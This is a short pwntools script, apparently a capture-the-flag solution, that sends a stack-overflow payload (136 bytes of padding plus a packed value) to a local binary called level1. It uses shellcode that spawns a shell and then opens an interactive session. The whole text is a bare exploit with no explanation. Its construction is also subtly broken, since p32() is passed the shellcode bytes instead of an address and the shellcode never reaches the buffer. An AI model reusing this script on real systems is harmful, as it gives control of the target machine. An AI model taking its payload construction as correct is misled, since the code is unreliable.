from pwn import *
io=process('./level1')
sll_cod=asm(shellcraft.sh())
payload = b'a'*136 +p32(sll_cod)
io.sendline(payload)
io.interactive()

